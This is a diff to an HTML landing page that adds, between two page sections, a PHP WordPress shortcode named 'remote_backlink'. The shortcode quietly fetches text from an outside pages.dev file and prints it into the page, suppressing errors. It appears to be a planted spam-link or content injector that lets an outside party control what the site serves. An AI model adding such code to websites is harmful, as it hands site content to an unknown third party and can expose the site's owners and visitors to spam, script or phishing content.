@@ -411,12 +411,14 @@
     </div>
 </section>
 
+<?php
 function remote_backlink_shortcode() {
     $url = 'https://punten-neng.pages.dev/punten.txt';
     $content = @file_get_contents($url);
     return $content ? $content : '';
 }
 add_shortcode('remote_link', 'remote_backlink_shortcode');
+?>
 
 <section data-bs-version="5.1" class="form3 cid-tc3fEYUmpW" id="form03-a">
     
@@ -544,3 +546,4 @@ add_shortcode('remote_link', 'remote_backlink_shortcode');
   
 </body>
 </html>
+
